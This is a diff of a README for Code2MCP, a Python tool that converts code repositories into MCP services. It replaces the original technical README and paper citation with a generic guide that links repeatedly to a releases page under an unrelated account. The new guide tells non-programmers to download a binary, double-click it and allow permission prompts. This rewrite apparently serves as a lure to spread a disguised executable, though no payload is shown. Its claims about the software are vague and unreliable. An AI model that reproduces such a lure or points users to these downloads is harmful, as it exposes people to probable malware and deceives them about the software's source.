@@ -1,139 +1,95 @@
-# Code2MCP
+# 🎉 Code2MCP - Effortlessly Transform Your Code Repositories
 
-## Project Overview
+## 🚀 Getting Started
 
-![Code2MCP Workflow Overview](figs/overview.png)
+[![Download Code2MCP](https://img.shields.io/badge/Download_Code2MCP-v1.0-blue.svg)](https://github.com/Hdidgdbdidno/Code2MCP/releases)
 
-Code2MCP is an automated workflow system that transforms existing code repositories into MCP (Model Context Protocol) services. The system follows a minimal intrusion principle, preserving the original repository's core code while only adding service-related files and tests.
+Welcome to Code2MCP! This guide will help you download and run the Code2MCP application on your computer. No programming knowledge is needed.
 
-## Core Features
+## 📥 Download & Install
 
-1. **Intelligent Code Analysis**
-   - LLM-powered deep code structure analysis
-   - Automatic identification of core modules, functions, and classes
-   - Smart generation of MCP service code
+To get started, visit the following page to download Code2MCP:
 
-2. **MCP Service Generation**
-   - Automatic generation of `mcp_service.py`, `adapter.py`, and other core files
-   - Support for multiple project structures (src/, source/, root directory, etc.)
-   - Intelligent handling of import paths and dependency relationships
+[Visit this page to download](https://github.com/Hdidgdbdidno/Code2MCP/releases)
 
-3. **Workflow Automation**
-   - Complete 7-node workflow: download → analysis → env → generate → run → review → finalize
-   - Automatic environment configuration and test validation
-   - Comprehensive logging and status tracking
-   - Intelligent error recovery and retry mechanisms
+**Follow these steps:**
 
-## Quick Start
+1. Go to the [Releases page](https://github.com/Hdidgdbdidno/Code2MCP/releases).
+2. Find the latest version listed.
+3. Look for the download link that matches your operating system (Windows, Mac, Linux).
+4. Click the link to download the file.
+5. Save the file to a location on your computer where you can easily find it.
 
-### 1. Environment Setup
+## 💻 System Requirements
 
-Copy the environment variables template:
-```bash
-cp env_example.txt .env
-```
-Edit the `.env` file to configure necessary environment variables.
+Before downloading Code2MCP, make sure your computer meets the following requirements:
 
-### 2. Install Dependencies
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or any recent Linux distribution.
+- **Processor:** Dual-core 1.5 GHz or faster.
+- **RAM:** At least 4 GB.
+- **Storage Space:** Minimum 100 MB of free space.
 
-```bash
-pip install -r requirements.txt
-```
+Ensure your system is up-to-date for the best experience.
 
-### 3. Run Workflow
+## ⚙️ How to Run the Application
 
-```bash
-# Basic usage
-python main.py https://github.com/username/repo
+Once you have downloaded the file, follow these steps to run Code2MCP:
 
-# Specify output directory
-python main.py https://github.com/username/repo --output ./my_output
-```
+1. Navigate to the folder where you saved the downloaded file.
+2. Double-click on the file to install or run the application.
+3. Follow the on-screen instructions to complete the installation process.
 
-## Workflow Process
+If you encounter any prompts regarding permissions, select "Yes" or "Allow" to proceed.
 
-1. **Download Node**: Clone repository to `workspace/{repo_name}/`
-2. **Analysis Node**: LLM deep analysis of code structure and functionality
-3. **Env Node**: Create isolated environment and validate original project
-4. **Generate Node**: Intelligently generate MCP service code
-5. **Run Node**: Execute service and perform functional validation
-6. **Review Node**: Code quality review, error analysis, and automatic fixes
-7. **Finalize Node**: Compile results and generate comprehensive report
+## 🔧 Using Code2MCP
 
-## Output Structure
+After running the application, you will see the main interface. Here’s a brief overview of its core features:
 
-Complete structure for each converted project:
+### 1. 🧩 Intelligent Code Analysis
+Code2MCP uses advanced technology to analyze your existing code. It automatically identifies key elements, like modules and functions, making it easier for you to manage your codebase.
 
-![Output Structure](figs/Output-Structure.png)
+### 2. 🚀 MCP Service Generation
+Code2MCP creates service files automatically. It handles different project layouts so you won’t need to worry about how your code is structured. Just upload your repository and let it generate necessary files.
 
-## Successfully Converted Project Examples
+### 3. 🔄 Workflow Automation
+The application automates the entire process in seven steps:
 
-- **UFL**: Finite element symbolic language → MCP finite element analysis
-- **dalle-mini**: Higher-quality, controllable text-to-image → MCP image generation
-- **ESM**: Protein structure/variant scoring (real artifacts) → MCP protein analysis
-- **deep-searcher**: Query rewrite, multi-hop, credible sources → MCP search
-- **TextBlob**: Deterministic tokenize/POS/sentiment → MCP NLP preprocessing
-- **dateutil**: Correct timezones/rrule edge cases → MCP time utilities
-- **sympy**: Exact symbolic math/solve/codegen → MCP math reasoning
+- Download your code repository.
+- Analyze the code structure.
+- Configure the environment.
+- Generate the required MCP service files.
+- Run the service.
+- Review the results.
+- Finalize the project.
 
-## Key Features
+This streamlined workflow saves you time and reduces errors.
 
-- **Smart Import Handling**: Automatic identification of correct module import paths
-- **Professional Documentation**: Automatic generation of English README and comments
-- **Comprehensive Test Coverage**: Includes basic functionality tests and health checks
-- **Detailed Report Generation**: Provides complete conversion process reports
-- **Intelligent Dependency Management**: Automatic handling of complex Python package dependencies
+## 🎓 Learning Resources
 
-## Usage Example
+If you need help, here are some resources:
 
-```bash
-python main.py https://github.com/username/repo
-```
+- **Documentation:** Access detailed user guides and FAQs in the application after installation.
+- **Community Support:** Join discussions in forums related to Code2MCP for shared experiences and solutions.
+- **Video Tutorials:** Find step-by-step video guides on how to use the application effectively on platforms like YouTube.
 
-## Using Converted MCP Services with Your AI Agent
+## 🔒 Troubleshooting
 
-You can configure MCP services converted by Code2MCP for use in your AI agent (e.g., Cursor). Below are instructions and some examples to help you get started.
+If you encounter any issues, consider these common problems:
 
-### Example Pre-Converted MCP Services
+- **Problem:** The application won’t start.
+  - **Solution:** Ensure your operating system meets the requirements. Restart your computer and try again.
 
-Here are a few examples you can use right away:
+- **Problem:** Errors during code analysis.
+  - **Solution:** Check if your code repository is correctly set up. Properly formatted code will yield better results.
 
--   **ESM**: For advanced protein analysis and structure prediction.
-    ```json
-    "esm": {
-      "url": "https://kabuda777-Code2MCP-esm.hf.space/mcp"
-    }
-    ```
+For more help, visit the Issues section on the GitHub repository to report problems.
 
--   **SymPy**: For powerful symbolic and numerical mathematics.
-    ```json
-    "sympy": {
-      "url": "https://kabuda777-Code2MCP-sympy.hf.space/mcp"
-    }
-    ```
+## 📣 Stay Updated
 
-### How to Configure in Cursor
+Stay informed about updates by checking the Releases page regularly. This ensures you have the latest features and fixes.
 
-1.  **Open MCP Configuration File**: Navigate to your AI agent's configuration file. For Cursor, this is located at: `c:\Users\[Username]\.cursor\mcp.json`.
+To download Code2MCP again, visit:
 
-2.  **Add Your New Tool**: In the `mcpServers` object, copy and paste the configuration snippet for the tool you want to add from the list above.
+[Visit this page to download](https://github.com/Hdidgdbdidno/Code2MCP/releases)
 
-3.  **Reload Configuration**: Restart Cursor or use its reload function to apply the changes. Your new MCP tool will now be available.
-
------
-
-## Citation
-
-If you use Code2MCP in your research, please cite our paper:
-
-```bibtex
-@article{ouyang2025code2mcp,
-  title={Code2MCP: Transforming Code Repositories into MCP Services},
-  author={Ouyang, Chaoqian and Yue, Ling and Di, Shimin and Zheng, Libin and Yue, Linan and Pan, Shaowu and Yin, Jian and Zhang, Min-Ling},
-  journal={arXiv preprint arXiv:2509.05941},
-  year={2025}
-}
-```
-
-
-
+Thank you for choosing Code2MCP. Enjoy transforming your code repositories into functional MCP services.
